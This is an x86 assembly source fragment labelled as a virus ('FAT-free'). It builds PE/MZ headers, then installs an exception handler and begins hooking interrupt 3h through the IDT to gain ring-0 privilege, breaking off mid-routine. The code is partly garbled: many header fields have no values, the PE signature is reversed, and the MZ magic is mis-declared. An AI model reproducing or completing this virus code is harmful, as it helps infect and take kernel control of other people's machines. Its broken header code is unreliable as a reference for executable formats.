;****************
;* Information: *
;****************
;**
;* Name: FAT-free
;* Date: 11.02.2026, Version 1.0
;* Last modified: 11.02.2026
;**
;* Assembling:
;* nasm -f bin fat-free.asm -o fat-free.exe
;**
;*=====================================================*
;* Modification history *
;*=====================================================*
;* v1.0
;********************************************************

cpu 586
bits 32
org 400000h

;**********************************
;* PE and MZ Header, Do not touch *
;**********************************

Header:
.e_magic db 5A4Dh   ; MZ
.e_cblp dw
.e_cp dw
.e_crlc dw
.e_cparhdr dw
.e_minalloc dw
.e_maxalloc dw
.e_ss dw
.e_sp dw
.e_csum dw
.e_ip dw
.e_cs dw
.e_lfarlc dw
.e_ovno dw
.e_res dq
.e_oemid dw
.e_res2 times 20 db 0
.e_lfanew dd

.pe:
.Signature db 'E', 'P', 0, 0  ; Signature
.Machine dw 014Ch ;i386
.NumberOfSections dw 
.TimeDateStamp dd
.PointerToSymbolTable dd
.NumberOfSymbols dd
.SizeOfOptionalHeader dw
.Characteristics dw

;********************************************
; End of Headers *
;********************************************

;********************************************
;* Constants *
;********************************************
HookExceptionNumber equ 3h

;********************************************
;* Virus Start *
;********************************************
virus_start:
push ebp
;******************************************
;* First order of buisness is *
;* to modify SEH So that if an exceptions *
;* occur we still have control *
;******************************************
lea eax, [esp-4h*2]

xor ebx, ebx
xchg eax, [fs:ebx]

call .get_delta
.get_delta:
pop ebx

lea ecx, [ebx+(ExceptionOccured-.get_delta)]

push ecx
push eax

;***************************
;* Now we need to actually *
;* Hook Int 3h *
;* To actually get Ring 0 *
;***************************

push eax
sidt [esp-02h]
pop ebx              ; EBX = base adress of idt

add ebx, HookExceptionNumber*08h+04h

cli

mov ebp, [ebx]
mov bp, [ebx-04h]

lea esi, [ecx+(IntHandler-ExceptionOccured)] ; ESI = Memory adress of 
                                             ; ExceptionOccured+(IntHandler-ExceptionOccured)
